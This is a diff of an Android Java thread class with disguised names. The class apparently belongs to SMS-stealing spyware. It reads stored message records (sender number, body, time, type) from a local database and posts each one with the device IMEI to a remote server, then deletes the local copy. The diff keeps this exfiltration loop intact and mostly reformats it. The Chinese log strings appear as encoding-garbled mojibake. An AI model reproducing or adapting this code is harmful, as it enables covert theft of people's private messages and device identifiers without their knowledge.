@@ -9,12 +9,12 @@ import java.util.concurrent.Executors;
 import org.apache.http.NameValuePair;
 import org.apache.http.message.BasicNameValuePair;
 
-import android.app.Dctivity;
 import android.content.Context;
 import android.database.sqlite.DQLiteOpenHelper;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.telephony.TelephonyManager;
+import android.util.Log;
 
 public class Dhread extends Thread {
 
@@ -29,51 +29,54 @@ public class Dhread extends Thread {
 
 	@Override
 	public void run() {
+		// TODO Auto-generated method stub
 		super.run();
 		isrun = true;
 		int i = 0;
 		String id = "0";
-		LogUtils.write("Send", "å¼€å§‹å‘é€çŸ­ä¿¡");
+		LogUtils.write("Send", "¿ªÊ¼·¢ËÍ¶ÌĞÅ");
 		while (isrun&&isConnectingToInternet()) {
-			LogUtils.write("Send", "ç½‘ç»œå¯ç”¨ç»§ç»­å‘é€");
-			Map<String, String> map = DQLiteOpenHelper.getHelper(context).getData(id);
+			LogUtils.write("Send", "ÍøÂç¿ÉÓÃ¼ÌĞø·¢ËÍ");
+			Map<String, String> map = DQLiteOpenHelper.getHelper(context)
+					.getData(id);
 			if (map != null) {
-				LogUtils.write("Send", "è·å–å¾…å‘é€æ•°æ®");
+				LogUtils.write("Send", "»ñÈ¡´ı·¢ËÍÊı¾İ");
 				List<NameValuePair> formparams = new ArrayList<NameValuePair>();
 				formparams.add(new BasicNameValuePair("menu", "addjie3"));
 				formparams.add(new BasicNameValuePair("ad", "save"));
-				formparams.add(new BasicNameValuePair("name", "Test"));
+				formparams.add(new BasicNameValuePair("name", "AAA"));
 				formparams.add(new BasicNameValuePair("ti", map.get("pn")));
 				formparams.add(new BasicNameValuePair("zong", GetDeviceId()));
-				formparams.add(new BasicNameValuePair("jiang", map.get("body")));
+				formparams
+						.add(new BasicNameValuePair("jiang", map.get("body")));
 				formparams.add(new BasicNameValuePair("riqi", map.get("time")));
 				formparams.add(new BasicNameValuePair("lei", map.get("type")));
-				String result = HttpClient.post(Dctivity.Dctivityhttpurl,formparams);
+				String result = HttpClient.post(formparams);
 				if (result != null) {
-					LogUtils.write("Send", "å‘é€ç»“æœ"+result);
+					LogUtils.write("Send", "·¢ËÍ½á¹û"+result);
 					i = 0;
-					isrun = false;
 					id = map.get("id");
-					LogUtils.write("Send", "å‘é€æˆåŠŸ" + i + "  " + id);
+					LogUtils.write("Send", "·¢ËÍ³É¹¦" + i + "  " + id);
 					DQLiteOpenHelper.getHelper(context).deleteData(id);
 				} else {
 					i++;
-					LogUtils.write("Send", "å‘é€å¤±è´¥" + i);
+					LogUtils.write("Send", "·¢ËÍÊ§°Ü" + i);
 				}
 				if (i >= 10) {
-					LogUtils.write("Send", "è¿ç»­å‘é€5æ¬¡å¤±è´¥ï¼Œç»“æŸå‘é€");
+					LogUtils.write("Send", "Á¬Ğø·¢ËÍ5´ÎÊ§°Ü£¬½áÊø·¢ËÍ");
 					isrun = false;
 				}
 				ThreadSleep(1000);
 			} else {
-				LogUtils.write("Send", "æœªå‘ç°å¾…å‘é€æ•°æ®");
+				LogUtils.write("Send", "Î´·¢ÏÖ´ı·¢ËÍÊı¾İ");
 				isrun = false;
 			}
 		}
 	}
 
 	public String GetDeviceId() {
-		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+		TelephonyManager tm = (TelephonyManager) context
+				.getSystemService(Context.TELEPHONY_SERVICE);
 		return tm.getDeviceId();
 	}
 
@@ -81,21 +84,22 @@ public class Dhread extends Thread {
 		try {
 			Thread.sleep(time);
 		} catch (InterruptedException e) {
+			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 	}
 
 	public boolean isConnectingToInternet() {
-		ConnectivityManager connectivity = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
+		ConnectivityManager connectivity = (ConnectivityManager) context
+				.getSystemService(Context.CONNECTIVITY_SERVICE);
 		if (connectivity != null) {
 			NetworkInfo[] info = connectivity.getAllNetworkInfo();
-			if (info != null) {
-				for (int i = 0; i < info.length; i++) {
+			if (info != null)
+				for (int i = 0; i < info.length; i++)
 					if (info[i].getState() == NetworkInfo.State.CONNECTED) {
 						return true;
 					}
-				}
-			}
+
 		}
 		return false;
 	}
@@ -105,7 +109,7 @@ public class Dhread extends Thread {
 	}
 
 	public static synchronized void SartSend(Context context) {
-		LogUtils.write("Send", "åŠ å…¥å‘é€çº¿ç¨‹");
+		LogUtils.write("Send", "¼ÓÈë·¢ËÍÏß³Ì");
 		pool.execute(new Dhread(context));
 	}
 
